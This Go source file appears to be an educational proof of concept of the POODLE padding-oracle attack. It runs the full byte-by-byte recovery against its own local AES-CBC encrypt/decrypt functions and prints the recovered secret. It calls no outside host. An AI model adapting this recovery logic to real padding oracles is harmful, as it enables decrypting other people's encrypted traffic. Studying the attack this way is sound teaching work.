package poodle

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/ckasidis/tls-attacks-poc/utils"
)

// Function to print tampered request
func printTamperedRequest(request [][]byte, replaced int) {
	for i, b := range request {
		if i == replaced || i == len(request)-1 {
			fmt.Fprintf(os.Stdout, "%s%s%s", utils.ColorRed, b, utils.ColorNone)
		} else {
			fmt.Printf("%s", b)
		}
	}
	fmt.Println()
}

// Function to adjust padding for POODLE attack
func adjustPadding(plainText []byte) (int, int) {
	// Encrypt secret
	key, iv := genRandomKeys()
	encryptedSecret := encrypt(plainText, key, iv)
	originalLength := len(hex.EncodeToString(encryptedSecret))
	// Adjust padding so last block is full of padding
	padding := 1
	for {
		paddedSecret := encrypt(append(bytes.Repeat([]byte{'a'}, padding), []byte(plainText)...), key, iv)
		newLength := len(hex.EncodeToString(paddedSecret))
		// New block: last block is full of padding
		if newLength > originalLength {
			break
		}
		padding++
	}
	return originalLength, padding
}

// Function to demonstrate a POODLE attack
func Attack(secret []byte) {
	var blockSecret []byte
	var blockSecrets []string
	// Calculate extra padding required for POODLE attack and get original length (hex)
	originalLength, padding := adjustPadding(secret)
	initialPadding := padding
	fmt.Printf("Initial Padding: %d\n", initialPadding)
	fmt.Println()
	// Block Length for AES is 128 bits = 32 hex
	blockLength := 32
	// Loop through last block of secret
	for block := originalLength/blockLength - 2; block > 0; block-- {
		for char := 0; char < utils.BlockSize; char++ {
			count := 0
			for {
				key, iv := genRandomKeys()
				// % = dummy bytes before padding, # = padding, $ = dummy bytes after secret
				paddedInput := fmt.Sprintf("%s%s%s%s", bytes.Repeat([]byte("%"), utils.BlockSize), bytes.Repeat([]byte("#"), padding), secret, bytes.Repeat([]byte("$"), block*utils.BlockSize-char))
				encrypted := encrypt([]byte(paddedInput), key, iv)
				request := utils.SplitBlocks([]byte(hex.EncodeToString(encrypted)), 32)
				// Change the last block with a block we want to attack
				request[len(request)-1] = request[block]
				// Join the blocks for decryption
				cipher, _ := hex.DecodeString(string(bytes.Join(request, nil)))
				_, err := decrypt(cipher, key, iv)
				count++
				// If there is no error, attacker can decipher the last byte
				if err == nil {
					// Update the padding to reveal the next byte
					padding++
					// Cn-1
					Cn1 := request[len(request)-2]
					// Ci-1
					Ci1 := request[block-1]
					Cn1LastByte, _ := hex.DecodeString(string(Cn1[len(Cn1)-2:]))
					Ci1LastByte, _ := hex.DecodeString(string(Ci1[len(Ci1)-2:]))
					// Decipher a byte
					// Pn = D(Cn) XOR Cn-1
					// Pn = D(Ci) XOR Cn-1
					// (XXXX XXXX XXXX XXXF) = D(Ci) XOR Cn-1
					// (XXXX XXXX XXXX XXXF) = Pi XOR Ci-1 XOR Cn-1
					// Pi = (XXXX XXXX XXXX XXXF) XOR Ci-1 XOR Cn-1
					decipherByte := 0x0f ^ Ci1LastByte[0] ^ Cn1LastByte[0]
					// Update block secret
					blockSecret = append(blockSecret, decipherByte)
					// Reverse block secret and print to console
					secretReversed := utils.ReverseByteSlice(blockSecret)
					fmt.Fprintf(os.Stdout, "Obtained byte %s%x%s - Block %d : [%16s]\n", utils.ColorCyan, decipherByte, utils.ColorNone, block, bytes.ToUpper(secretReversed))
					break
				}
			}
		}
		fmt.Println()
		// Save block secret
		blockSecret = utils.ReverseByteSlice(blockSecret)
		blockSecrets = append([]string{string(blockSecret)}, blockSecrets...)
		// Reset block secret
		blockSecret = []byte{}
		// Reset padding
		padding = initialPadding
	}
	// Join all block secrets to reveal obtained secret
	obtainedSecret := strings.Join(blockSecrets, "")
	// Remove padding
	obtainedSecret = strings.ReplaceAll(obtainedSecret, "#", "")
	// Print obtained secret without padding
	fmt.Fprintf(os.Stdout, "%s%s%s\n%s\n", utils.ColorRed, "Obtained Secret from POODLE attack:", utils.ColorNone, obtainedSecret)
}
